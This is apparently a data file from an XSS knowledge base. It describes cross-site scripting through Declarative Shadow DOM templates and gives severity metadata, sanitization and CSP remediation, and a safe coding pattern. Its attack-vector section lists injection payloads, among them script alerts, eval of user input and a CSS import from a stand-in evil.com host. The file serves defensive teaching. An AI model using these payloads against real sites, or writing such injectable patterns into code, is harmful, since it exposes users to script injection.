#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: Declarative Shadow DOM XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via Declarative Shadow DOM",
    "severity": "high",
    "cvss_score": 7.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "shadow-dom", "declarative", "web-components", "chrome-111"],
    "description": """
Declarative Shadow DOM (Chrome 111+) allows defining shadow roots in HTML.
XSS vulnerabilities occur when user input is reflected in shadow root content
or template definitions without sanitization.

SEVERITY: HIGH
Shadow DOM isolation can be bypassed if content is injected before shadow root creation.
""",
    "attack_vector": """
DECLARATIVE SHADOW DOM TEMPLATE:
<template shadowrootmode="open">
  <script>alert(1)</script>
</template>

SHADOW ROOT CONTENT INJECTION:
<template shadowrootmode="open">
  <div>${userInput}</div>  // XSS if not sanitized
</template>

SHADOW ROOTMODE INJECTION:
<template shadowrootmode="<script>alert(1)</script>">
  Content
</template>

SHADOW ROOT SLOT INJECTION:
<template shadowrootmode="open">
  <slot name="<script>alert(1)</script>"></slot>
</template>

SHADOW ROOT STYLE INJECTION:
<template shadowrootmode="open">
  <style>@import url('//evil.com/xss.css')</style>
</template>

SHADOW ROOT SCRIPT INJECTION:
<template shadowrootmode="open">
  <script>eval(userInput)</script>
</template>
""",
    "remediation": """
DEFENSE:

1. Sanitize all content before creating shadow roots
2. Validate shadowrootmode attribute values
3. Use textContent for text content in shadow DOM
4. Implement CSP
5. Validate template content before parsing

SAFE PATTERN:
const template = document.createElement('template');
template.setAttribute('shadowrootmode', 'open');
const content = document.createElement('div');
content.textContent = userInput;  // Safe
template.content.appendChild(content);

SANITIZATION:
import DOMPurify from 'dompurify';
template.innerHTML = DOMPurify.sanitize(userInput);

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- Web Components Security
- Shadow DOM Specification
""",
}
